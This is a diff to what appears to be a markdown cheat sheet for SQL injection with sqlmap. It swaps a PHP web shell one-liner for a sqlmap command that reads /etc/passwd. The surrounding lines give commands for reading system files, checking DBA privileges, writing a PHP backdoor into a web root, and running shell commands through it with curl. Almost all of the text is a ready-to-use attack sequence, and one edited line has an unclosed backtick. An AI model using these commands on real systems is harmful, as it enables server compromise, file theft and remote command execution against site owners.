@@ -203,9 +203,7 @@ Command to read file : `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`
 
 Checking for DBA Privileges : `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`
 
-Reading Local Files : ```shell-session
- echo '<?php system($_GET["cmd"]); ?>' > shell.php
-```
+Reading Local Files :`sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
 
 Create a PHP Payload and then use this command to write that payload or Backdoor into the Server : `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`
 To execute command, we can use the command : `curl http://www.example.com/shell.php?cmd=ls+-la`
